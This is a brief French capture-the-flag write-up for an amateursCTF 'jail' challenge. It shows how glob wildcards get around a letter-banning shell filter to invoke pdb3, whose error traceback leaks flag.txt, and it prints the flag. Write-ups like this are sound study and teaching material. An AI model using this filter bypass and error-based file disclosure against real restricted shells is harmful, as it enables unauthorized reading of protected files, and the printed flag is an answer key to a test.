#jail 
Le script utilisé:
![[shell (2) 1.py]]

Tout l'alphabet est banni, impossible d'écrire des lettres sans se faire kick. On est donc limités à certains caractères spéciaux et aux chiffres. Tout d'abord, on peut voir qu'on est dans le dossier /app et qu'il y a un flag.txt dans ce répertoire.
```
$ ./* /bin/sh: 1: ./flag.txt: Permission denied 
$ ../* /bin/sh: 1: ../app: Permission denied
```
Un moyen d'exécuter des commandes est le <font style="color:green">?</font>, j'ai essayé de jouer avec:
![[Pasted image 20240406222854.png]]

Il semble y avoir quelque chose d'autre dans notre répertoire et ce fichifer fait 3 caractères. C'est un exécutable car pas d'erreur, mais il break notre shell. C'est apparement run:

![[Pasted image 20240406222914.png]]

J'ai essayé de spécifier des arguments au ./??? mais aucun succès. Pas d'erreur non plus. Après plein de tentatives, j'ai trouvé que /???/???3 renvoyait vers pdb3. On peut donc s'en servir pour debug le répertoire où se trouve le flag:

```
$ /???/???3 ./*
Traceback (most recent call last):
 File "/usr/lib/python3.11/pdb.py", line 1774, in main
 pdb._run(target)
 File "/usr/lib/python3.11/pdb.py", line 1652, in _run
 self.run(target.code)
 File "/usr/lib/python3.11/bdb.py", line 597, in run
 exec(cmd, globals, locals)
 File "<string>", line 1, in <module>
 File "/app/flag.txt", line 1

amateursCTF{pic0_w45n7_g00d_n0ugh_50_i_700k_som3_cr34t1v3_l1b3rt135_ade8820
e}
 ^
SyntaxError: invalid syntax
```

Vu que flag.txt est un fichier texte, une exception est levée et nous permet de découvrir le contenu de flag.txt